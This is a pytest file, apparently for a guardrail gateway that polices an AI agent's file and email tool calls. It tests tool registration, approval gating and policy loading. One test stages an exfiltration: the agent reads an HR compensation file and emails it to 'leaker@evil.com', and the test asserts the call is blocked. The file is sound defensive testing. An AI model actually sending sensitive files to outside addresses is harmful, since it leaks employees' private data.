"""corp 域（v0.3）：文件/邮件域工具、策略与语料测试。

验证 spec §18.1「领域是显式可控成本」：同一引擎接第二个领域，
只改策略与工具注册，不改判定代码。
"""

import httpx
import pytest
from asgi_lifespan import LifespanManager

from guardrail.config import Settings
from guardrail.main import create_app
from shop.main import create_app as create_shop_app


@pytest.fixture
async def corp_client(tmp_path):
    shop_app = create_shop_app(str(tmp_path / "shop.db"))
    app = create_app(
        Settings(shop_base_url="http://shop.test",
                 gateway_db_path=str(tmp_path / "gateway.db"),
                 policy_path="policies/corp_single_call.yaml",
                 combined_policy_path="policies/corp_combined_risk.yaml"),
        shop_transport=httpx.ASGITransport(app=shop_app),
    )
    async with LifespanManager(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://t") as c:
            yield c


async def _corp_session(c):
    return (await c.post("/v1/sessions",
                         json={"agent_id": "corp_agent",
                               "task_id": "corp-t"})).json()["session_id"]


# ---------- Task 1：工具规格与 handler ----------


def test_corp_specs_pass_registry_validation():
    from guardrail.tools.registry import TOOL_SPECS, assert_specs_valid

    for name in ("list_files", "read_file", "write_file", "send_email"):
        assert name in TOOL_SPECS, f"corp 工具 {name} 未注册"
    assert_specs_valid()  # 全注册表（含 corp）自检必须通过


async def test_corp_handlers_mutate_in_memory_state(corp_client):
    sid = await _corp_session(corp_client)
    r = await corp_client.post("/v1/tools/write_file", json={
        "session_id": sid,
        "args": {"path": "hr/compensation.csv", "content": "name,salary"}})
    assert r.status_code == 200, r.text
    r2 = await corp_client.post("/v1/tools/read_file", json={
        "session_id": sid, "args": {"path": "hr/compensation.csv"}})
    assert r2.status_code == 200
    assert r2.json()["result"]["file"]["content"] == "name,salary"
    r3 = await corp_client.post("/v1/tools/list_files", json={
        "session_id": sid, "args": {}})
    assert "hr/compensation.csv" in [f["path"] for f in r3.json()["result"]["files"]]


async def test_corp_ask_approval_executes_with_corp_context(corp_client):
    sid = await _corp_session(corp_client)
    last = None
    for i in range(7):
        last = await corp_client.post("/v1/tools/write_file", json={
            "session_id": sid,
            "args": {"path": f"hr/file-{i}.txt", "content": "x"},
        })
    assert last is not None
    assert last.status_code == 202

    approval_id = last.json()["pending_approval_id"]
    r = await corp_client.post(
        f"/v1/approvals/{approval_id}/resolve",
        json={"resolution": "approve", "decided_by": "boss"},
    )
    assert r.status_code == 200
    assert r.json()["result"]["file"]["path"] == "hr/file-6.txt"


async def test_ecommerce_policy_denies_corp_tools(corp_client):
    """隔离靠权限表：ecommerce 策略不授权任何 agent 用 corp 工具。"""
    sid = (await corp_client.post("/v1/sessions", json={
        "agent_id": "ops_agent", "task_id": "t-1"})).json()["session_id"]
    r = await corp_client.post("/v1/tools/read_file", json={
        "session_id": sid, "args": {"path": "hr/compensation.csv"}})
    assert r.status_code == 403


# ---------- Task 2：corp 策略 ----------


def test_corp_policies_load_and_scope():
    from guardrail.policy.loader import (
        load_combined_policy,
        load_plan_policy,
        load_policy,
    )

    single = load_policy("policies/corp_single_call.yaml")
    assert set(single.permissions) == {"corp_agent"}
    assert set(single.permissions["corp_agent"]) == {
        "list_files", "read_file", "write_file", "send_email",
        "read_forum", "post_forum", "create_ticket", "execute_wire"}
    combined = load_combined_policy("policies/corp_combined_risk.yaml")
    rule_ids = [r.id for r in combined.rules]
    assert "corp_data_exfiltration" in rule_ids
    assert "corp_email_fanout" in rule_ids
    # B4 二期：按汇拆分的三条污点规则 + wire 审批门槛
    assert "corp_forum_publish" in rule_ids
    assert "corp_cross_system_leak" in rule_ids
    # B4 二期：按汇拆分的三条污点规则 + wire 审批门槛
    assert "corp_forum_publish" in rule_ids
    assert "corp_cross_system_leak" in rule_ids
    load_plan_policy("policies/plan_policy.yaml")  # 分级系数共用


async def test_corp_taint_blocks_exfiltration(corp_client):
    """读敏感文件 → 外部域邮件：污点外传被拦（Bench-Corp 核心场景语义）。"""
    sid = await _corp_session(corp_client)
    await corp_client.post("/v1/tools/write_file", json={
        "session_id": sid,
        "args": {"path": "hr/compensation.csv", "content": "name,salary"}})
    # 污点源是读动作：先读敏感文件再外发。
    await corp_client.post("/v1/tools/read_file", json={
        "session_id": sid, "args": {"path": "hr/compensation.csv"}})
    r = await corp_client.post("/v1/tools/send_email", json={
        "session_id": sid,
        "args": {"to": "leaker@evil.com", "subject": "data", "body": "x"}})
    assert r.status_code == 403
    assert "corp_data_exfiltration" in r.json()["detail"]


async def test_corp_internal_email_allowed(corp_client):
    sid = await _corp_session(corp_client)
    await corp_client.post("/v1/tools/write_file", json={
        "session_id": sid,
        "args": {"path": "hr/compensation.csv", "content": "name,salary"}})
    r = await corp_client.post("/v1/tools/send_email", json={
        "session_id": sid,
        "args": {"to": "audit@internal.corp", "subject": "对账", "body": "x"}})
    assert r.status_code == 200
